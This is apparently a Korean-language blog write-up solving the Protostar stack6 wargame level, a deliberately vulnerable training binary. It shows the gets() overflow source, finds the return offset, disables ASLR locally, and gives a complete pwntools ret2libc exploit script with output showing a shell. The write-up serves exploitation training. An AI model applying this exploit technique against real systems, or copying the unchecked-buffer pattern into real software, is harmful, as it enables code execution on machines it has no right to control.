---
layout: post
title: "[exploit-exercise] Protostar stack6"
date: 2017-06-04 02:00:00이
description: "Wargmae Protostar 문제풀이"
category: wargame
tags:  [rop, ret2libc]
---

[Protostar Stack6 - Exploit Exercises](https://exploit-exercises.com/protostar/stack6/)

>Stack6 looks at what happens when you have restrictions on the return address.
>
>This level can be done in a couple of ways, such as finding the duplicate of the payload (objdump -s) will help with this), or ret2libc, or even return orientated programming.
>
>It is strongly suggested you experiment with multiple ways of getting your code to execute here.
>
>This level is at /opt/protostar/bin/stack6

<!--more--> 

## Source

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void getpath()
{
  char buffer[64];
  unsigned int ret;

  printf("input path please: "); fflush(stdout);
  gets(buffer);
  ret = __builtin_return_address(0);

  if((ret & 0xbf000000) == 0xbf000000) {
      printf("bzzzt (%p)\n", ret);
      _exit(1);
  }

  printf("got path %s\n", buffer);
}

int main(int argc, char **argv)
{
  getpath();
}
```


## Analysis

```
pwndbg> checksec
[*] '.../wargame/protostar/stack6/stack6'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
```



## Vulnerability

BoF 는 80bytes 이후에 발생.

```
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
[+] Saved as '$_gef0'

gef➤  c
Continuing.
input path please: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
got path aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaauaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
...
0x61616175 in ?? ()

gef➤  pattern search 0x61616175
[+] Searching '0x61616175'
[+] Found at offset 80 (little-endian search) likely
[+] Found at offset 77 (big-endian search)
```


## Exploit

### ASLR off

Protostar VM 은 `pwntools`도 없고, `socat` 으로 디버깅하면 잘 안되고 해서... 로컬에서 ASLR off 하고 풀이해보는 걸로...

```bash
$ sudo sysctl -w kernel.randomize_va_space=0
kernel.randomize_va_space = 0
```


### ret2libc

기본적인 ret2libc 로 exploit 구성 가능.

```python
ROP = "A" * 80
ROP += p32(system_addr)
ROP += "B"*4
ROP += p32(binsh_string)
```


### `system`, `/bin/sh` 주소 얻기

```
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0xf7e37060 <__libc_system>

gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f5b84f ("/bin/sh")
```


## Exploit code

```python
from pwn import *
import time

HOST = '127.0.0.1'
PORT = 4000

local = True

if local:
    conn = process("./stack6")
else:
    conn = remote(HOST, PORT)

elf = ELF("./stack6")

gdb.attach(conn)

"""
gdb-peda$ p system
$2 = {<text variable, no debug info>} 0xf7e37060 <__libc_system>
"""
system_addr = 0xf7e37060

"""
gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 1 results, display max 1 items:
libc : 0xf7f5b84f ("/bin/sh")
"""
binsh_string = 0xf7f5b84f

ROP = "A" * 80
ROP += p32(system_addr)
ROP += "B"*4
ROP += p32(binsh_string)

print "[+] ROP={}\n".format(ROP)

conn.sendline(ROP)

""" interactive
"""
conn.interactive()
```


## Execution

```bash
$ python solv.py
[+] Starting local process './stack6': pid 15184
[*] '.../wargame/protostar/stack6/stack6'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[*] running in new terminal: /usr/bin/gdb -q  "/media/psf/Home/_2O2L2H/github/awesome-ctf-wargame/wargame/protostar/stack6/stack6" 15184
[+] Waiting for debugger: Done
[+] ROP=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`pBBBBO\xb8

[*] Switching to interactive mode
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA`pAAAAAAAAAAAA`pBBBBO\xb8
$                                                                                                                       id
uid=1000(tkhwang) gid=1000(tkhwang) groups=1000(tkhwang),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),121(lpadmin),131(sambashare)
$ pwd
/.../wargame/protostar/stack6
```








